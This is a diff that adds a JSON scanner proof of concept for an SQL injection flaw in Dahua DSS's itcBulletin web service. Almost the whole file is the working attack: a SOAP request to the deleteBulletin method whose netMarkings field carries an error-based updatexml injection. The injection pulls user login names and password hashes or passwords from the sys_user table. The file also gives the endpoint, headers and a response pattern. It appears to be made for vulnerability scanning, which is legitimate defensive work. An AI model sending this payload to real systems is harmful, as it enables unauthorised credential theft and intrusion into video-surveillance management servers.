@@ -1,0 +1,15 @@
+{
+	"name":"大华DSSitcBulletinSQL注入",
+	"tag":"dahua",
+	"type":"other",
+	"poc":{
+		"pocGet":"/portal/services/itcBulletin?wsdl",
+		"pocPost":"<s11:Envelope xmlns:s11='http://schemas.xmlsoap.org/soap/envelope/'>\r\n  <s11:Body>\r\n    <ns1:deleteBulletin xmlns:ns1='http://itcbulletinservice.webservice.dssc.dahua.com'>\r\n      <netMarkings>\r\n        (updatexml(1,concat(0x7e,(select substr(group_concat(login_name, \" \",login_pass),1,30) from sys_user),0x7e),1))) and (1=1\r\n      </netMarkings>\r\n    </ns1:deleteBulletin>\r\n  </s11:Body>\r\n</s11:Envelope>",
+		"header":{
+			"User-Agent":" Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
+			"Accept-Encoding":" gzip"
+		},
+		"status_code":"200",
+		"pattern":"(XPATH)"
+	}
+}
